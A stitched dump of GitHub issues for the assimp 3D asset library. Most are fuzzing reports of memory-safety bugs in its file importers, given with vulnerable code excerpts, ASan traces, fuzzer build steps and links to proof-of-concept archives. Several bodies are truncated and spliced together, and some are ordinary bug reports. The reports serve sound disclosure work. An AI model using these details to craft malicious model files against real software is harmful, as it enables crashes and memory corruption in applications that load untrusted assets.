/* code/AssetLib/Blender/BlenderLoader.cpp:1127 — ConvertLight */
switch (lamp->type) {   /* no range check; legal values 0..4 */
    case Blender::Lamp::Type::TYPE_LOCAL:  ... break;
    ...
    /* no default branch */
}

/* code/AssetLib/Blender/BlenderLoader.cpp:1203 — ConvertNode */
switch (obj->type) {    /* legal: {0,1,2,3,4,5,10,11,21,22}; no range check */

/* code/AssetLib/Blender/BlenderLoader.cpp:450  — ResolveTexture (from BuildMaterials:688) */
switch (rtex->type) {   /* legal: 1..15; no range check */
```

Call chain:

```
Assimp::Importer::ReadFileFromMemory() (Importer.cpp:507)
  └─ Assimp::Importer::ReadFile() (Importer.cpp:709)
       └─ BlenderImporter::InternReadFile() (BlenderLoader.cpp:158)
            └─ ConvertBlendFile() (BlenderLoader.cpp:304)
                 ├─ ConvertNode() → switch(obj->type)
                 │    └─ ConvertLight() → switch(lamp->type)
                 └─ BuildMaterials() → ResolveTexture() → switch(rtex->type)
```

**Platform**

- OS: Linux x86-64 (Ubuntu 22.04)
- Compiler: Clang 18 with `-fsanitize=address,undefined -fno-sanitize-recover=all`
- assimp version: commit `a433d5a` (master, 2026-08)
- Fuzzing engine: AFL++ via `LLVMFuzzerTestOneInput` harness
- Exit code: 132 (SIGILL, trap-mode UBSAN)

**Additional context**

- Deterministic: yes — same input always triggers. Three distinct crash sites confirmed, all sharing the same root cause (missing enum range validation).
- Reachability: any .blend input reaches these paths through the generic `ReadFileFromMemory` API. The fuzz harness does nothing special — it calls `Importer::ReadFileFromMemory(buffer, size, 0, hint)`.
- Impact in release builds: the out-of-range enum falls through a switch with no default, leaving light/texture/node struct fields uninitialized. This can corrupt downstream rendering or trigger further UB.

## Affected Projects
assimp v5.4.3 ([https://github.com/assimp/assimp](https://github.com/assimp/assimp))
## Problem Type
CWE-122: Heap-based Buffer Overflow
## Description
### Summary
A heap-buffer-overflow vulnerability arises in the `Assimp::SceneCombiner::Copy(aiTexture**, aiTexture const*)` function within the Assimp Library defined in `code/Common/SceneCombiner.cpp` at line `1198`. 
The reason is that the function did not check the memory boundaries allocated to `old` (i.e. the original `dest->pcData`) before calling `memcpy`, resulting in out of bounds reads to `old` in poc crash.
```cpp
void SceneCombiner::Copy(aiTexture **_dest, const aiTexture *src) {
    if (nullptr == _dest || nullptr == src) {
        return;
    }

    aiTexture *dest = *_dest = new aiTexture();

    // get a flat copy
    *dest = *src;

    // and reallocate all arrays. We must do it manually here
    const char *old = (const char *)dest->pcData;
    if (old) {
        unsigned int cpy;
        if (!dest->mHeight)
            cpy = dest->mWidth;
        else
            cpy = dest->mHeight * dest->mWidth * sizeof(aiTexel);

        if (!cpy) {
            dest->pcData = nullptr;
            return;
        }
        // the cast is legal, the aiTexel c'tor does nothing important
        dest->pcData = (aiTexel *)new char[cpy];
        ::memcpy(dest->pcData, old, cpy);    //heap-buffer-overflow
    }
}
```

items.body:
**Describe the bug**
Integer overflow can happen in function `MDLImporter::CreateTextureARGB8_3DGS_MDL3()` if two high numbers are provided in the multiplication in line [127](https://github.com/assimp/assimp/blob/8621d5243070eb85ad7411634b5463731fdac7ed/code/AssetLib/MDL/MDLMaterialLoader.cpp#L127).

This value is then checked for validity through `VALIDATE_FILE_SIZE()` which will in the end call `SizeCheck()` is `IsPosValid()`. The problem here is that, with the overflow occuring, the resulting value that is checked in these last two functions can be valid, as part of it will likely be truncated because of the overflow, resulting in an undetermined computation.

I can see that, a few lines after this error occurs, you are already checking for another integer overflow (this last check avoids using the result of an overflow to access memory), you can fix this error with the same approach by detecting the overflow before it happens and raising an error, with something like:
```
    if(pcHeader->skinwidth != 0 && pcHeader->skinheight > UINT_MAX/pcHeader->skinwidth) {
        throw DeadlyImportError("Invalid MDL file. [...]");
    }
```
before performing the multiplication.

**Reproduce**
You can reproduce the error by using the file in the [attached archive](https://github.com/user-attachments/files/20613303/1.zip). We tested your fuzzing harness compiling with LLVM 20 and AFL++ 4.32, on Ubuntu 20.04. To detect this issue, UBSan is needed.

items.body:
## Environment
- OS: Ubuntu 22.04
- Compiler: clang 13.0.1
- C++ Standard: C++17
- Sanitizers: AddressSanitizer (ASan) + UndefinedBehaviorSanitizer (UBSan)
- Assimp Version: 6.0.2 / master commit [0581ed5](https://github.com/assimp/assimp/commit/0581ed5f114ebea8654d3ce16cd5b64f59b8c7b3)

## Build Instructions
```
export CC=clang-13
export CXX=clang++-13
export CFLAGS="${CFLAGS} -fsanitize=address -O1 -g"
export CXXFLAGS="${CXXFLAGS} -fsanitize=address -O1 -g"
export LDFLAGS="${LDFLAGS} -fsanitize=address"

export LIB_FUZZING_ENGINE="-fsanitize=fuzzer"

cmake CMakeLists.txt -G "Ninja" -DBUILD_SHARED_LIBS=OFF -DASSIMP_BUILD_ZLIB=ON \
                                -DASSIMP_BUILD_TESTS=ON -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \
                                -DASSIMP_BUILD_SAMPLES=OFF
cmake --build .

$CXX $CXXFLAGS $LIB_FUZZING_ENGINE -std=c++11 -I./include \
        fuzz/assimp_fuzzer.cc -o ./assimp_fuzzer  \
        ./lib/libassimp.a ./contrib/zlib/libzlibstatic.a
```

## Reproduction
Run the fuzzer with a crafted input file:
```
./assimp_fuzzer poc
```

## Observed Behavior
Program crashes with ASan/UBSan report:

```
==1959368==ERROR: AddressSanitizer: requested allocation size 0x1c1b04999f0 (0x1c1b049a9f0 after adjustments for alignment, red zones etc.) exceeds maximum supported size of 0x10000000000 (thread T0)
    #0 0x519efd in operator new(unsigned long) (/assimp_fuzzer+0x519efd)
    #1 0x1489ccc in __gnu_cxx::new_allocator<Assimp::Q3DImporter::Material>::allocate(unsigned long, void const*) /usr/bin/../lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/ext/new_allocator.h:127:27
    #2 0x1489ccc in std::allocator_traits<std::allocator<Assimp::Q3DImporter::Material> >::allocate(std::allocator<Assimp::Q3DImporter::Material>&, unsigned long) /usr/bin/../lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/bits/alloc_traits.h:464:20
    #3 0x1489ccc in std::_Vector_base<Assimp::Q3DImporter::Material, std::allocator<Assimp::Q3DImporter::Material> >::_M_allocate(unsigned long) /usr/bin/../lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/bits/stl_vector.h:346:20
    #4 0x1489ccc in Assimp::Q3DImporter::Material* std::vector<Assimp::Q3DImporter::Material, std::allocator<Assimp::Q3DImporter::Material> >::_M_allocate_and_copy<Assimp::Q3DImporter::Material const*>(unsigned long, Assimp::Q3DImporter::Material const*, Assimp::Q3DImporter::Material const*) /usr/bin/../lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/bits/stl_vector.h:1511:29
    #5 0x957941 in Assimp::BaseImporter::ReadFile(Assimp::Importer*, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, Assimp::IOSystem*) /root/assimp/code/Common/BaseImporter.cpp:131:9
    #6 0x522c01 in Assimp::Importer::ReadFile(char const*, unsigned int) /root/assimp/code/Common/Importer.cpp:709:30
    #7 0x52082b in Assimp::Importer::ReadFileFromMemory(void const*, unsigned long, unsigned int, char const*) /root/assimp/code/Common/Importer.cpp:507:9
    #8 0x51c8ba in LLVMFuzzerTestOneInput /root/assimp/fuzz/assimp_fuzzer.cc:57:34
    ...
```

## Root Cause Analysis
https://github.com/assimp/assimp/blob/0581ed5f114ebea8654d3ce16cd5b64f59b8c7b3/code/AssetLib/Q3D/Q3DLoader.cpp#L122-L133
The crash occurs in the Q3DImporter::InternReadFile function, where the importer reads the number of materials (numMats) directly from the input file without validation. This value is then used in a call to materials.reserve(numMats) and later in a loop with materials.emplace_back(). Since numMats is attacker-controlled, a malicious file can specify an extremely large value, leading the program to request an allocation far exceeding addressable memory. This results in an allocation-size-too-big error under ASan and causes the process to terminate.


The attached file contains a proof-of-concept.
[poc.zip](https://github.com/user-attachments/files/22407575/poc.zip)

```
    #3 0x16c7474 in ODDLParser::OpenDDLParser::parseStructure(char*, char*) /root/assimp/contrib/openddlparser/code/OpenDDLParser.cpp:347:22
    #4 0x16c9913 in ODDLParser::OpenDDLParser::parseNextNode(char*, char*) /root/assimp/contrib/openddlparser/code/OpenDDLParser.cpp:249:10
    #5 0x16c9913 in ODDLParser::OpenDDLParser::parseStructureBody(char*, char*, bool&) /root/assimp/contrib/openddlparser/code/OpenDDLParser.cpp:435:14
    #6 0x16c7474 in ODDLParser::OpenDDLParser::parseStructure(char*, char*) /root/assimp/contrib/openddlparser/code/OpenDDLParser.cpp:347:22
    #7 0x16c5225 in ODDLParser::OpenDDLParser::parseNextNode(char*, char*) /root/assimp/contrib/openddlparser/code/OpenDDLParser.cpp:249:10
    #8 0x16c5225 in ODDLParser::OpenDDLParser::parse() /root/assimp/contrib/openddlparser/code/OpenDDLParser.cpp:229:19
    ...
```

## Root Cause Analysis
Using GDB, I inspected the parser state at the crash site. The _in_ pointer was found to be greater than the _end_ pointer (_in_ > _end_), which violates the contract assumed by functions like getNextSeparator. As a result, the loop condition while (in != end && !isSeparator(*in)) attempts to dereference *in past the allocated buffer.
https://github.com/assimp/assimp/blob/0581ed5f114ebea8654d3ce16cd5b64f59b8c7b3/contrib/openddlparser/include/openddlparser/OpenDDLParserUtils.h#L441-L446
This likely originates from an earlier function (parseDataList, parseStructureBody, or lookForNextToken) that incorrectly advanced _in_ beyond _end_.

The attached file contains a proof-of-concept.
[poc.zip](https://github.com/user-attachments/files/22417682/poc.zip)

items.title: Bug: Binary ply - Line-ending char after the end_header line causes parsing issues

labels.name: Bug
labels.description: Global flag to mark a deviation from expected behaviour

labels.name: PLY
labels.description: Bugs related to the PLY format

labels.name: Char encoding
labels.description: Bugs related to the character encoding

items.body:
**Describe the bug**
For a binary ply, if the first char after the "end_header\n" line is '\n' (hence empty line), this char (and line) will be skipped, causing the parser to read the first face element as a vertex part, and shifting everything (all vertices will be incorrect, and faces will be wrong).

**To Reproduce**
Steps to reproduce the behavior:
1. Take a binary ply, replace the first char after "end_header\n" by '\n' and try to import it in assimp.
2. See error, there will probably be something like 'Validation failed: aiMesh::mFaces[4]::mIndices[0] is out of range' (because of the shifting)

**Expected behavior**
The mesh should be read without any issue.

**Platform (please complete the following information):**
 - OS: Windows 10
 - Version: reproduced on current master (tag 77a8f01)

**Additional context**
My mesh is a little endian mesh with faces property 'property list uchar int vertex_indices', since the first line begins with x03x00x00x00x00x01x00x00x00x02, the first char (x03) is considered as the last part of the vertices, hence the 4 first faces are considered to have 0 vertices, and the fifth to have 1 vertex of index 33554432 (which is larger than the total number of vertices, hence the validation error).

The removal of the end of line char error occurs in the PlyParser.cpp file, because of the function SkipSpacesAndLineEnd(std::vector<char> &buffer) called in PLY::Element::ParseElement(IOStreamBuffer<char> &streamBuffer, std::vector<char> &buffer, PLY::Element *pOut), itself called in PLY::DOM::ParseHeader(IOStreamBuffer<char> &streamBuffer, std::vector<char> &buffer, bool isBinary); which will remove the "empty line" after the end of the header

**To Reproduce**
Steps to reproduce the behavior:

1. Clone the assimp repository and build it refer to oss-fuzz.

```shell
export CC=clang \
    CXX=clang++ \
    CFLAGS='-fsanitize=address -O0 -g' \
    CXXFLAGS='-fsanitize=address -O0 -g' \
    LIB_FUZZING_ENGINE='-fsanitize=fuzzer'
```

2. Run the PoC using assimp_fuzzer:

[poc.zip](https://github.com/user-attachments/files/27425090/poc.zip)

```shell
./assimp_fuzzer ./poc.mdl
```

````
vPosition.x = _AI_MDL7_ACCESS_VERT(groupInfo.pcGroupVerts, iIndex, pcHeader->mainvertex_stc_size).x;
````

items.body: **Describe the bug** A heap-buffer overflow vulnerability was discovered in `AddBonesToNodeGraph_3DGS_MDL7` located in `code/AssetLib/MDL/MDLLoader.cpp:1719` when parsing malformed 3DGS MDL7 model files. The vulnerability is caused by using an untrusted bone count value from the input file to iterate over a fixed-size heap-allocated bone pointer array, leading to an out-of-bounds memory read. The loop uses `pcHeader->bones_num` (read from file) as the upper bound, but the actual allocated size of `apcBones` is smaller. This causes `apcBones2++` to step past the end of the allocated buffer, leading to a heap buffer overflow read at address `0x51c000000798`. ``` // MDLLoader.cpp: line 1714-1723 const MDL::Header_MDL7 *const pcHeader = (const MDL::Header_MDL7 *)this->mBuffer; const MDL::IntBone_MDL7 **apcBones2 = apcBones; for (uint32_t i = 0; i < pcHeader->bones_num; ++i) { const MDL::IntBone_MDL7 *const pcBone = *apcBones2++; // overflow happens here if (pcBone->iParent == iParentIndex) { ++pcParent->mNumChildren; } } ``` **To Reproduce** Steps to reproduce the behavior: 1. items.body: **Describe the bug** The `ImportMeshes` function in `code/AssetLib/glTF2/glTF2Importer.cpp` (`line 752`) does not validate the index count before accessing `indexBuffer[1]` for `LINE_LOOP` or `LINE_STRIP` primitives. If a mesh primitive provides fewer than 2 indices, the code reads beyond the bounds of the `indexBuffer` vector, triggering a heap-buffer-overflow. When the input GLB file contains a mesh primitive with `mode` set to `LINE_LOOP` or `LINE_STRIP` but only 1 index, the code proceeds to execute: ``` SetFaceAndAdvance2(facePtr, aim->mNumVertices, indexBuffer[0], indexBuffer[1]); ``` At this point: - `count = 1` - `indexBuffer.size() = 1` - Accessing `indexBuffer[1]` reads beyond the allocated memory of the vector, causing the overflow. **To Reproduce** Steps to reproduce the behavior: 1. Clone the assimp repository and build it refer to oss-fuzz. ```shell export CC=clang \ CXX=clang++ \ CFLAGS='-fsanitize=address -O0 -g' \ CXXFLAGS='-fsanitize=address -O0 -g' \ LIB_FUZZING_ENGINE='-fsanitize=fuzzer' ``` 2. Run the PoC using assimp_fuzzer_glb: [poc.zip](https://github.com/user-attachments/files/27431042/poc.zip) The PoC is provided as a zip archive. items.title: Bug: Failing tests when compiling with `-mfma`

labels.name: Testing
labels.description: Global flag to mark testing topics

labels.name: Bug
labels.description: Global flag to mark a deviation from expected behaviour

items.body:
**Describe the bug**
Tests are failing when Assimp is compiled with the `-mfma` flag.

**To Reproduce**
Steps to reproduce the behavior:

1. Replace `Dockerfile` in the root of the repository:
```Dockerfile
FROM gcc:15.2.0

RUN apt-get update && \
    apt-get install --no-install-recommends -y ninja-build cmake zlib1g-dev

WORKDIR /app

COPY . .

RUN mkdir build && cd build && \
    cmake -G 'Ninja' \
    -DCMAKE_BUILD_TYPE=Release \
    -DASSIMP_WARNINGS_AS_ERRORS=OFF \
    -DCMAKE_C_FLAGS='-mfma' \
    -DCMAKE_CXX_FLAGS='-mfma' \
    .. && \
    ninja -v -j4 && ninja install

CMD ["/app/build/bin/unit"]
```
2. `docker build . -t assimp`
3. `docker run --rm -it assimp`. Tests are flaky, they sometimes fail and sometimes not, you may need to run this multiple times to encounter a failure.

Running the above container requires a CPU with support for FMA instruction set. From what I gathered, that should be most Intel and AMD CPUs produced in the last 8 years. On Linux, support for FMA can be verified with the following command: `cat /proc/cpuinfo | grep -w fma`.
If a CPU with FMA support is not available, the following Dockerfile can be used as an alternative. It uses QEMU to emulate the CPU that supports FMA, but keep in mind that it is significantly slower than running on a real CPU:
```Dockerfile
FROM gcc:15.2.0

RUN apt-get update && \
    apt-get install --no-install-recommends -y ninja-build cmake zlib1g-dev qemu-user-static

WORKDIR /app

COPY . .

RUN mkdir build && cd build && \
    cmake -G 'Ninja' \
    -DCMAKE_BUILD_TYPE=Release \
    -DASSIMP_WARNINGS_AS_ERRORS=OFF \
    -DCMAKE_C_FLAGS='-march=znver2' \
    -DCMAKE_CXX_FLAGS='-march=znver2' \
    .. && \
    ninja -v -j4 && ninja install

CMD ["qemu-x86_64", "-cpu", "EPYC-Rome-v2", "/app/build/bin/unit"]
```

**Expected behavior**
Tests do not fail.

**Platform (please complete the following information):**
 - OS: `Linux work 6.12.69-hardened1 #1-NixOS SMP PREEMPT_DYNAMIC Fri Feb  6 15:55:51 UTC 2026 x86_64 GNU/Linux`
 - Version: assimp v6.0.4

**Additional context**
I encountered this when compiling with `-march=znver2`, which in turn enables `-mfma`.

The failures are caused by `AssimpAPITest*` tests. Many of these tests compute seemingly the same values — once with the C++ API and once with the C API — and then compare values for equality with `EXPECT_EQ`. Unfortunately, the C++ standard does not guarantee that the non-exact floating-point operations return the same values when calculated multiple times. A compiler is free to compute floating-point expressions with greater precision (https://eel.is/c++draft/expr#pre-6), and the precision need not be the same when the value is computed again.

In this PoC the particular compiler optimization that causes tests failures is floating-point contraction. Disabling it with `-ffp-contract=off` fixes the problem. This optimization allows the compiler to compute floating-point expressions of the form `(x * y) + z` without rounding the intermediate `x * y` result. A compiler can, but doesn't have to perform this optimization. My guess is that, within the tests, a compiler optimizes the C++ API more heavily than the C API because the former can be inlined.

**Possible fixes**
I can think of a few possible fixes. I can create a PR, but I wanted to ask maintainers for an opinion with what solution should I proceed.

1. Compile with `-ffp-contract=off`. This seems to fix the problem. However, according to C++ standard tests are still not guaranteed to succeed. It is possible that there exist other optimizations that might resurface this problem again. Moreover, a compiler might add such optimizations in the future. Furthermore, this disables potentially beneficial compiler optimization.

2. Remove failing tests. The reasoning is that these tests check that the C++ API and the C API compute exactly the same results. But this requirement is not satisfied. Nor should it be, no one should expect non-exact floating-point computations to produce exact equality. However, removing failing tests would leave some of the C API not covered by unit tests (as most of the existing tests deal with the C++ API). For that, I can think of these possible solutions:
2.1. Leave some of the C API untested. The C API is a thin wrapper around the C++ API. In cases of a future PR that would modify some C API function so that it is no longer just a wrapper for a corresponding C++ function, maintainers can ask the author to add unit tests for that particular C function.
2.2. Copy some of the existing C++ API tests and modify them to use the C API instead. This might increase effort when creating future PRs as modifying these tests would require modifying both C++ and C tests.

3. Rewrite failing tests and use values that ensure that all floating-point calculations are exact. This requires ensuring that every intermediate calculation is either exact, or if it's not, that the increase in precision doesn't affect the result. This might end up being hard to maintain as in theory every change to the code could introduce intermediate result that is not exact. But in practice, I suspect that using whole integer values and checking that the result is also representable with whole integer values, would be enough to fix the tests.

My opinion is to go with solution 2.2. But solution 2.1. might also be valid if the maintainers can ensure that the C API fully corresponds to the C++ API with just code review. This could possibly require less maintenance effort than maintaining separate C++ and C tests. I'm unsure about that though, that's the main reason I wanted to ask about maintainers opinions.

items.body: **Describe the bug** A heap-based buffer over-read is found in `HL1MDLLoader::extract_anim_value` at `code/AssetLib/MDL/HalfLife/HL1MDLLoader.cpp:1332`. It seems there is no sanity check for the `num.total` field. If it is zero, the while loop condition is always true and runs infinitely. Inside the loop, the pointer keeps moving forward step by step without any range limit. Eventually it goes out of the allocated heap buffer, triggers an out-of-bounds read, and crashes the program. **To Reproduce** Steps to reproduce the behavior: 1. Clone the assimp repository and build it refer to oss-fuzz. ```shell export CC=clang \ CXX=clang++ \ CFLAGS='-fsanitize=address -O0 -g' \ CXXFLAGS='-fsanitize=address -O0 -g' \ LIB_FUZZING_ENGINE='-fsanitize=fuzzer' ``` 2. items.body: **Describe the bug** A heap-buffer-overflow vulnerability was found in Assimp when parsing malformed LWS/LWO animation files. The out-of-bounds read occurs at `LWOAnimation.cpp:227` due to an invalid iterator traversal in a `std::vector`. **To Reproduce** Steps to reproduce the behavior: 1. Clone the assimp repository and build it refer to oss-fuzz. ```shell export CC=clang \ CXX=clang++ \ CFLAGS='-fsanitize=address -O0 -g' \ CXXFLAGS='-fsanitize=address -O0 -g' \ LIB_FUZZING_ENGINE='-fsanitize=fuzzer' ``` 2. Run the PoC using assimp_fuzzer: [poc.zip](https://github.com/user-attachments/files/27234527/poc.zip) The PoC is provided as a zip archive. After extracting, run: ```shell ./assimp_fuzzer ./poc.lws ``` **Cause** In function `Assimp::LWO::AnimResolver::UpdateAnimRangeSetup()`, the loop uses: ``` for (auto it2 = m; it2 != n; ++it2) { it2->time -= cur_minus; // line 227 (CRASH) ... } ``` The loop only checks `it2 != n` and does not stop at `vector::end()`. When `n` is an invalid/overrun iterator, `it2` will go out of the vector's valid memory range and cause a heap-buffer-overflow. **ASAN Report** ``` items.body: **Describe the bug** A heap-buffer-overflow vulnerability exists in Assimp during data decompression, the vulnerable function is `Assimp::Compression::decompressBlock` located in `code/Common/Compression.cpp` line 188, and the actual crash occurs at `contrib/zlib/inflate.c` line 1077. **To Reproduce** Steps to reproduce the behavior: 1. Clone the assimp repository and build it refer to oss-fuzz. ```shell export CC=clang \ CXX=clang++ \ CFLAGS='-fsanitize=address -O0 -g' \ CXXFLAGS='-fsanitize=address -O0 -g' \ LIB_FUZZING_ENGINE='-fsanitize=fuzzer' ``` 2. Run the PoC using assimp_fuzzer: [poc.zip](https://github.com/user-attachments/files/27237535/poc.zip) The PoC is provided as a zip archive. After extracting, run: ```shell ./assimp_fuzzer ./poc.x ``` **Cause** 1. The `XFileImporter` allocates a fixed-size input buffer based on the file size (`fileSize + 1`). 2. When parsing the file, the decompression logic passes the full buffer to `zlib` without validating whether the compressed data adheres to the declared length. 3. The malformed compressed data incorrectly signals that there are more bytes to read than the buffer contains. 4. `zlib`'s `inflate` function, following the instructions in the malformed data, items.title: Bug: Vertex Count different between v5.4.0 and v6.0.2 of assimp

labels.name: Bug
labels.description: Global flag to mark a deviation from expected behaviour

labels.name: FBX
labels.description: Bugs related to the FBX format

items.body:
**Describe the bug**

I work on the MonoGame project, we use assimp to handle our 3D model format conversions.
We recently tried to update from v5.4.0 of assimp to v6.0.2 so we could make use of the IgnoreFbxUpDirection feature. However our unit tests failed when one of our sample models got a signifficant change in the number of vertices being exported.

This might be perfectly fine, but on the other hand it might be an issue?

**To Reproduce**
Steps to reproduce the behavior:
1. Download the attached .fbx file
2. Run 5.4.0 of `assimp info dube_2011.fbx` note the data
3. Run 6.0.2 of `assimp info dube_2011.fbx` note the data

**Expected behavior**

I would expect the number of vertices and faces to remain consistent between the two .
The zip contains the model as well as the output for both `info` calls. 
This is the output 

